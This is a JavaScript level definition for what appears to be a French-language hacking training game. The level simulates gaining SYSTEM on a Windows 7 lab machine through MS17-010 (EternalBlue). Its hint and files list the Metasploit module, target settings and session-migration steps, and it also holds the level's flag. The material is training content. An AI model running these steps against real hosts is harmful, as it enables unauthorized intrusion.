export const metasploit = {
  id: "metasploit",
  order: 6,
  title: "Metasploit",
  category: "Exploitation",
  difficulty: "Hard",
  flag: "MS17_010",
  unlocks: ["msfconsole", "meterpreter"],
  targetIp: "10.0.2.25",
  objective:
    "Exploiter SMB sur Windows 7, ouvrir une session Meterpreter et obtenir SYSTEM.",
  scenario:
    "Une machine Windows 7 expose SMB. Le scan automatique signale une vulnérabilité MS17-010.",
  hint:
    "Charge exploit/windows/smb/ms17_010_eternalblue, set RHOSTS 10.0.2.25, run, puis migrate 396.",
  files: {
    "readme.txt":
      "Detected OS: Windows 7. SMB service exposed on port 445. [CRITICAL] MS17-010 detected.",
    "metasploit.txt":
      "msfconsole workflow: use <module>, set RHOSTS <target>, set LPORT 4444, run.",
  },
};
